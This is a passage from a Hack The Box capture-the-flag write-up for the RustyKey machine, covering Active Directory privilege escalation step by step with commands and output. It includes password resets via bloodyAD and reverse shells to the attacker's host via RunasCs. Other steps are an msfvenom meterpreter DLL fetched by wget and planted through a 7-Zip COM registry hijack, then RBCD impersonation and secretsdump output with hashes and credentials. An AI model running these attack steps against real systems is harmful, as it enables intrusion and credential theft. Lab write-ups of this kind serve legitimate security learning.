<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">evil-winrm-py PS C:\Users\bb.morgan\Desktop&gt; reg query HKCR\CLSID /s /f &quot;zip&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_SZ    7-Zip Shell Extension</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">**HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End of search: 14 match(es) found.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>The second result is the CLSID of 7zip. What that means is, the CLSID</p>
<p><strong><code>{23170F69-40C1-278A-1000-000100020000}</code></strong>  is gonna use the 7zip DLL. We can check its permissions:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-ACL &quot;Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot; | fl</span><br></span></code></pre></div></div>
<p>(the fl part is format list, otherwise we canâ€™t really read the output properly)</p>
<p>The output:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Path   : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Owner  : BUILTIN\Administrators</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Group  : RUSTYKEY\Domain Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         BUILTIN\Administrators Allow  FullControl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         CREATOR OWNER Allow  FullControl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         **RUSTYKEY\Support Allow  FullControl**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         NT AUTHORITY\SYSTEM Allow  FullControl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         BUILTIN\Administrators Allow  FullControl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         BUILTIN\Users Allow  ReadKey</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Audit  : </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sddl   : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-41393220</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         52-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)</span><br></span></code></pre></div></div>
<p>Shows that the <strong>Support</strong> group has full control. Previously, we saw that <strong>ee.reed</strong> was in the support group, so itâ€™s time to get access to her account.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="getting-into-support">Getting into Support<a href="#getting-into-support" class="hash-link" aria-label="Direct link to Getting into Support" title="Direct link to Getting into Support" translate="no">â€‹</a></h3>
<p>We do the same attack, but this time we want access to <strong>ee.reed</strong>. First, letâ€™s add ourselves back to the Helpdesk group:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add groupMember &#x27;Helpdesk&#x27; &#x27;IT-COMPUTER3$&#x27;</span><br></span></code></pre></div></div>
<p>then, letâ€™s change the password of ee.reed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set password &#x27;ee.reed&#x27; &#x27;NewP@ss123&#x27;</span><br></span></code></pre></div></div>
<p>ee.reed is part of the Protected Objects group because of the Support group, so weâ€™ll have to remove that too</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 7-96c05ae4578e2fe65d8f491620d23018.png" width="1622" height="601" class="img_ev3q"></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bloodyAD -d rustykey.htb --host dc.rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remove groupMember &#x27;Protected Objects&#x27; &#x27;Support&#x27;</span><br></span></code></pre></div></div>
<p>And now all that remains is to get the TGT:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">impacket-getTGT RUSTYKEY.HTB/&#x27;ee.reed&#x27;:&#x27;NewP@ss123&#x27; </span><br></span></code></pre></div></div>
<p>However, when trying to authenticate using NetExec, evil-winrm or anything like that, we keep getting error messages. That means there is something blocking remote access, and ee.reed can only do local logins. This means that weâ€™re going to have to use RunasCs.exe</p>
<p>We get back into our winrm connection as bb.morgan, upload RunasCs.exe and run a reverse shell. We start a listener with <code>penelope -p 1234</code> and then we run the shell:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\RunasCs.exe ee.reed &#x27;NewP@ss123&#x27; powershell -r 10.10.14.132:1234</span><br></span></code></pre></div></div>
<p>Now we have a shell as ee.reed</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shell-as-eereed">Shell as ee.reed<a href="#shell-as-eereed" class="hash-link" aria-label="Direct link to Shell as ee.reed" title="Direct link to Shell as ee.reed" translate="no">â€‹</a></h3>
<p>As we saw previously, ee.reed is part of the Support group who can modify the registry with the CLSID of 7zip. First, letâ€™s get a DLL that will give us a reverse shell. We can craft one with <code>msfvenom</code> :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.132 LPORT=9001 -f dll \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-o payload.dll</span><br></span></code></pre></div></div>
<p>We get our listener ready:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole -q</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; set payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; set lhost 10.10.14.132</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; set lport 9001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; set ExitOnSession false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; exploit -j</span><br></span></code></pre></div></div>
<p>Then, we need to get our payload onto the target. For that, letâ€™s start a python server to host the file</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 8000 </span><br></span></code></pre></div></div>
<p>On the target, head to C:\ProgramData and get the file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://10.10.14.132:8000/payload.dll -o payl.dll</span><br></span></code></pre></div></div>
<p>Now, we need to point the 7zip CLSID to our malicious DLL:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Set-ItemProperty &quot;Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot;-name &quot;(default)&quot; -value &quot;C:\ProgramData\payl.dll&quot;</span><br></span></code></pre></div></div>
<p>Now if we run Get-Item</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-Item &quot;Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot;</span><br></span></code></pre></div></div>
<p>We see it is pointing to our dll:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Name                           Property                                                                                </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----                           --------                                                                                </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InprocServer32                 (default)      : C:\ProgramData\payl.dll                                                </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               ThreadingModel : Apartment </span><br></span></code></pre></div></div>
<p>Now, when a user tries to open up a 7zip file, it is going to access a dll and send us a reverse shell.</p>
<p>Sure enough, after some time, we get a connection on our listener. After running <code>whoami</code> , we see that the shell we have is as <code>mm.turner</code> .</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shell-as-mmturner">Shell as mm.turner<a href="#shell-as-mmturner" class="hash-link" aria-label="Direct link to Shell as mm.turner" title="Direct link to Shell as mm.turner" translate="no">â€‹</a></h3>
<p>If we look at bloodhoundâ€™s outbound object controls for mm.turner, we see that he is part of the Delegation Manager groups, who can act on the DC</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 8-e93f439d054b5e33ca3a1b831f2b531c.png" width="1094" height="536" class="img_ev3q"></p>
<p>This lets us do RBCD (Resource Based Constraint Delegation) so we need to get a user we want to delegate. If we look at the Administrator account, we see it has</p>
<p>Trusted For Constrained Delegation: False</p>
<p>so we canâ€™t use that</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/image 9-b3fca982dc1a612daeba38d0d79348f3.png" width="419" height="746" class="img_ev3q"></p>
<p>The same goes for the Backupadmin user.</p>
<p>So letâ€™s use our IT-COMPUTER3 account to impersonate other accounts (aka generate silver tickets).</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$</span><br></span></code></pre></div></div>
<p>and we can confirm this worked through the command:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-ADComputer DC -properties PrincipalsAllowedToDelegateToAccount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DNSHostName                          : dc.rustykey.htb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enabled                              : True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name                                 : DC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectClass                          : computer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PrincipalsAllowedToDelegateToAccount : {CN=**IT-Computer3**,OU=Computers,OU=IT,DC=rustykey,DC=htb}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName                       : DC$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UserPrincipalName                    : </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Now we just need the silver ticket:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">getST.py -spn cifs/dc.rustykey.htb -impersonate &#x27;backupadmin&#x27; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rustykey.htb/&#x27;IT-COMPUTER3$&#x27;:&#x27;Rusty88!&#x27;</span><br></span></code></pre></div></div>
<p>Note: We donâ€™t need to create a computer account in this case because we already know the password of IT-Computer3. The reason we create a new computer account usually in this attack is so that we can specify the password, which we donâ€™t need to do here.</p>
<p>Now we have the ccache of backupadmin (if we tried to do it with admin it would fail) so we can secretsdump:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py rustykey.htb/&#x27;backupadmin&#x27;@dc.rustykey.htb -k -no-pass</span><br></span></code></pre></div></div>
<p>And in that command we see the following snippet:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[--SNIP--]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] $MACHINE.ACC </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] DefaultPassword </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">**RUSTYKEY\Administrator:Rustyrc4key#!**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] DPAPI_SYSTEM </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[--SNIP--]</span><br></span></code></pre></div></div>
<p>Which shows the password of Administrator being <code>Rustyrc4key#!</code></p>
<p>We can confirm that with NetExec:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nxc smb dc.rustykey.htb -u &#x27;Administrator&#x27; -p &#x27;Rustyrc4key#!&#x27; -k</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\Administrator:Rustyrc4key#! (Pwn3d!) </span><br></span></code></pre></div></div>
<p>That means that all thatâ€™s left is to get the TGT</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">impacket-getTGT RUSTYKEY.HTB/&#x27;Administrator&#x27;:&#x27;Rustyrc4key#!&#x27;</span><br></span></code></pre></div></div>
<p>and finally log in with evil-winrm-py and read the root flag in Administratorâ€™s desktop!</p>
<p>Overall an amazing machine, learned a lot!</p>
<p><a href="https://labs.hackthebox.com/achievement/machine/2397718/669" target="_blank" rel="noopener noreferrer" class="">Owned RustyKey from Hack The Box!</a>
<img decoding="async" loading="lazy" alt="image.png" src="/writeups/assets/images/rustykeyPwned-8b79dd804ccb6f70650588ab64b7bd1d.png" width="700" height="360" class="img_ev3q"></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/docs/HTB/Gavel"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">ðŸ”’ Gavel (Active)</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#user" class="table-of-contents__link toc-highlight">User</a><ul><li><a href="#nmap-scan" class="table-of-contents__link toc-highlight">Nmap Scan</a></li><li><a href="#bloodhound" class="table-of-contents__link toc-highlight">Bloodhound</a></li><li><a href="#timeroasting" class="table-of-contents__link toc-highlight">Timeroasting</a></li><li><a href="#foothold" class="table-of-contents__link toc-highlight">Foothold</a></li></ul></li><li><a href="#privesc" class="table-of-contents__link toc-highlight">PrivEsc</a><ul><li><a href="#getting-into-support" class="table-of-contents__link toc-highlight">Getting into Support</a></li><li><a href="#shell-as-eereed" class="table-of-contents__link toc-highlight">Shell as ee.reed</a></li><li><a href="#shell-as-mmturner" class="table-of-contents__link toc-highlight">Shell as mm.turner</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">HackTheBox</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://app.hackthebox.com/users/2397718" target="_blank" rel="noopener noreferrer" class="footer__link-item">Profile<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://app.hackthebox.com/teams/7247" target="_blank" rel="noopener noreferrer" class="footer__link-item">Team (VXON)<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2026 Writeups lul, Inc. Respect me.. NOW.</div></div></div></footer></div>
</body>
</html>